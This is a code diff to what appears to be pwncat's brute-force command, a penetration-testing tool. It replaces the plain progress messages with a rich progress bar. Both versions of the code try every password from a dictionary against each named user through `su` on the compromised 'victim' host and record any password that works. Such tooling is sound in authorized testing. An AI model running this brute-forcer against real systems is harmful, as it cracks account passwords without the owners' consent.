@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 import argparse
+from rich.progress import Progress
 
-from pwncat import util
+from pwncat.util import console
 from pwncat.commands.base import CommandDefinition, Complete, Parameter
 import pwncat
 
@@ -41,19 +42,36 @@ class Command(CommandDefinition):
 
     def run(self, args):
 
-        for name in args.user:
-            args.dictionary.seek(0)
-            for line in args.dictionary:
-                line = line.strip()
-                util.progress(f"bruteforcing {name}: {line}")
+        with Progress(
+            "bruteforcing",
+            "[blue]{task.description}",
+            "•",
+            "[cyan]{task.fields[password]}",
+        ) as progress:
+            tasks = [
+                progress.add_task(name, password="", start=False) for name in args.user
+            ]
+            for i, name in enumerate(args.user):
+                args.dictionary.seek(0)
+                progress.start_task(tasks[i])
+                for line in args.dictionary:
+                    line = line.strip()
 
-                try:
-                    # Attempt the password
-                    pwncat.victim.su(name, line, check=True)
-                    pwncat.victim.users[name].password = line
-                    util.success(f"user {name} has password {repr(line)}!")
-                    break
-                except PermissionError:
-                    continue
+                    progress.update(tasks[i], password=line)
 
-        util.success("bruteforcing completed")
+                    try:
+                        # Attempt the password
+                        pwncat.victim.su(name, line, check=True)
+                        pwncat.victim.users[name].password = line
+                        progress.update(
+                            tasks[i],
+                            password=f"password is [green]{repr(line)}[/green]",
+                        )
+                        break
+                    except PermissionError:
+                        continue
+                else:
+                    progress.update(
+                        tasks[i], password="[red]failed[/red]: no password found"
+                    )
+                progress.stop_task(tasks[i])
